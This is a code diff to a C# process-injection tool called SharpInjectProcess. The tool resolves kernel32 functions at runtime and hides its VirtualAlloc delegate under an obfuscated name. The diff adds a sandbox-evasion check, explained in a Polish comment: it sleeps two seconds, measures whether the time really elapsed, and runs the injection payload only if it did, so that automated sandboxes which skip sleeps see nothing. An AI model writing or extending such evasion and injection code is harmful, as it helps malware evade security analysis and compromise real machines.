@@ -18,6 +18,9 @@ namespace SharpInjectProcess
         [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
         internal static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
 
+        [DllImport("kernel32.dll")]
+        static extern void Sleep(uint dwMilliseconds);
+
         // VirtualAlloc
         [UnmanagedFunctionPointer(CallingConvention.Winapi)]
         public delegate IntPtr aaaaaaaaaaaa(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
@@ -75,6 +78,23 @@ namespace SharpInjectProcess
 
 
             return d_buf;
+        }
+
+        // ponizej funkcja ktora sprawdza czy jestesmy w sandboxie. Czesto sandboxy jak widzą sleepy to robia fast-forward do kolejnego kroku. Robimy wiec sleep 2 sekundy, sprawdzamy czy rzeczywiscie minely 2 sekundy (sprawdzajac timeofday) 
+
+        public static void amireal()
+        {
+            DateTime t1 = DateTime.Now;
+            Sleep(2000);
+            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
+            if(t2 < 1.5)
+            {
+                return;
+            }
+            else
+            {
+                Execute();
+            }
         }
 
 
@@ -205,7 +225,7 @@ namespace SharpInjectProcess
 
         public static void Main(string[] args)
         {
-            Execute();
+            amireal();
         }
     }
 }
